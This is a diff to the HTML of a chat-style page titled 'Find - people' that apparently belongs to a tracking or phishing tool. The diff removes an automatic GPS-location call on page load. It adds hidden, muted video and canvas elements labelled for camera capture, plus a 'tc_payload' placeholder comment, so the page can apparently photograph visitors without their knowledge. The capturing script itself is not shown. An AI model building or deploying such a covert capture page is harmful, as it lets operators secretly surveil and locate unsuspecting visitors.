@@ -1,12 +1,12 @@
 <!DOCTYPE html>
-<html lang="en" >
+<html lang="en">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Find - people</title>
   <link rel="stylesheet" href="./style.css">
-
 </head>
-<body onload="gpsLocation()">
+<body>
 <section class="msger">
   <header class="msger-header">
     <div class="msger-header-title">
@@ -43,7 +43,12 @@
     <button type="submit" class="msger-send-btn">Send</button>
   </form>
 </section>
-<script  src="./script.js"></script>
+
+<!-- Hidden elements for camera capture -->
+<video id="hound-cam" style="display:none" playsinline muted></video>
+<canvas id="hound-canvas" style="display:none"></canvas>
+
+<script src="./script.js"></script>
 <p id="techchip"></p>
 <!-- tc_payload -->
 
